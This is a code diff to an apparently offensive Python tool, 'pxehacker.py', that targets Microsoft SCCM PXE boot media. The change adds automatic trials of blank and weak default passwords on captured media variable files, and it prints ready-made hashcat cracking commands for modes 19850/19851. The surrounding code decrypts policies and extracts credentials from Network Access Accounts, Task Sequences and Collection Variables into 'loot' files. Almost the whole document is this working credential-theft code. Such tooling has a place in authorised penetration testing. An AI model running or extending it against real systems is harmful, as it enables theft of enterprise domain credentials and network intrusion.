@@ -12,7 +12,8 @@ Features:
   - Policy retrieval and CMS decryption (pure Python, no win32crypt)
   - Credential extraction from NAA, Task Sequences, and Collection Variables
   - Credential deobfuscation (3DES, AES-128/192/256)
-  - Hashcat hash extraction for offline cracking
+  - Automatic blank/weak default password trial before falling back to cracking
+  - Hashcat hash extraction for offline cracking (modes 19850/19851)
 """
 
 import argparse
@@ -64,6 +65,7 @@ decrypt_parser.add_argument("-o", "--output", help="Output directory for loot fi
 # Hash mode — extract SCCM hash from local .boot.var file
 hash_parser = subparsers.add_parser("hash", help="Extract SCCM hashcat hash from a local .boot.var file")
 hash_parser.add_argument("file", help="Path to the .boot.var file")
+hash_parser.add_argument("-o", "--output", help="Output directory for loot files if a weak password matches", type=str, default="./loot")
 
 # Derive-key mode — derive the .var AES key from a captured DHCP option 243 cryptokey blob
 derive_parser = subparsers.add_parser(
@@ -136,10 +138,23 @@ def detect_media_encryption_type(filedata):
     return None
 
 
+# Hashcat modes from https://github.com/chryzsh/hashcat-6.2.6-SCCM
+HASHCAT_MODES = {128: "19850", 256: "19851"}
+
+
 def build_sccm_hash(filedata):
     aes_bits = detect_media_encryption_type(filedata)
     aes_label = f"aes{aes_bits}" if aes_bits else "aes128"
-    return f"$sccm${aes_label}${filedata[:40].hex()}", aes_bits
+    hashcat_mode = HASHCAT_MODES.get(aes_bits)
+    return f"$sccm${aes_label}${filedata[:40].hex()}", aes_bits, hashcat_mode
+
+
+def print_hashcat_command(hashcat_hash, hashcat_mode):
+    if hashcat_mode:
+        print(f"[*] Hashcat mode: {hashcat_mode} (requires https://github.com/chryzsh/hashcat-6.2.6-SCCM)")
+        print(f"[*] Command: hashcat -m {hashcat_mode} -a 0 '{hashcat_hash}' wordlist.txt")
+    else:
+        print("[!] No known hashcat mode for this encryption type")
 
 def handle_decrypted_xml(sccm_client, decrypted_xml, output_dir):
     """Extract PFX cert and key info from decrypted media variables."""
@@ -319,16 +334,28 @@ def main():
 
     # === Hash mode ===
     if args.mode == "hash":
+        from lib import sccm
+
         try:
             with open(args.file, "rb") as f:
                 filedata = f.read()
-            hashcat_hash, aes_bits = build_sccm_hash(filedata)
+            hashcat_hash, aes_bits, hashcat_mode = build_sccm_hash(filedata)
             if aes_bits:
                 print(f"[*] Detected encryption: AES-{aes_bits}")
             else:
                 print("[!] Unknown encryption algorithm in header; defaulting hash label to aes128")
-            print("[*] Hashcat hash:")
-            print(hashcat_hash)
+
+            print("[*] Trying blank + common weak passwords before falling back to hash cracking...")
+            sccm_client = sccm.SCCM(None, None, None)
+            weak_password, decrypted = sccm_client.try_weak_passwords(filedata)
+            if decrypted:
+                print(f"[+] Decrypted media file using weak/default password: {weak_password!r}")
+                handle_decrypted_xml(sccm_client, decrypted, args.output)
+            else:
+                print("[!] No weak/default password matched.")
+                print("[*] Hashcat hash:")
+                print(hashcat_hash)
+                print_hashcat_command(hashcat_hash, hashcat_mode)
         except Exception as e:
             print(f"[!] Failed to extract hash: {e}")
         sys.exit(0)
@@ -398,7 +425,7 @@ def main():
     if cryptokey is None:
         # Password IS set — no crypto key in DHCP response, need to crack the hash
         print("[*] PXE media is password-protected (no crypto key in DHCP response)")
-        hashcat_hash, aes_bits = build_sccm_hash(data_variables)
+        hashcat_hash, aes_bits, hashcat_mode = build_sccm_hash(data_variables)
         print(f"[*] Detected encryption: AES-{aes_bits or 128}")
 
         if args.password:
@@ -411,11 +438,19 @@ def main():
                 print(f"[!] Decryption failed: {e}")
                 print(f"[*] You can also download the file manually from: \\\\{args.target}\\REMINST{variables}")
         else:
-            print("[*] Hashcat hash:")
-            print(hashcat_hash)
-            print("[*] Crack this hash, then re-run with: -p <cracked_password_hex>")
-            print(f"[*] Or download the variables file from: \\\\{args.target}\\REMINST{variables}")
-            print(f"[*] Then decrypt with: python3 pxehacker.py decrypt <variables_file> <cracked_password_hex>")
+            print("[*] Trying blank + common weak passwords before falling back to hash cracking...")
+            weak_password, decrypted = sccm_client.try_weak_passwords(data_variables)
+            if decrypted:
+                print(f"[+] Decrypted media file using weak/default password: {weak_password!r}")
+                handle_decrypted_xml(sccm_client, decrypted, args.output)
+            else:
+                print("[!] No weak/default password matched.")
+                print("[*] Hashcat hash:")
+                print(hashcat_hash)
+                print_hashcat_command(hashcat_hash, hashcat_mode)
+                print("[*] Crack this hash, then re-run with: -p <cracked_password_hex>")
+                print(f"[*] Or download the variables file from: \\\\{args.target}\\REMINST{variables}")
+                print(f"[*] Then decrypt with: python3 pxehacker.py decrypt <variables_file> <cracked_password_hex>")
     else:
         # No password set — crypto key IS in the DHCP response, can decrypt directly
         print("[*] No PXE password set (crypto key found in DHCP response)")
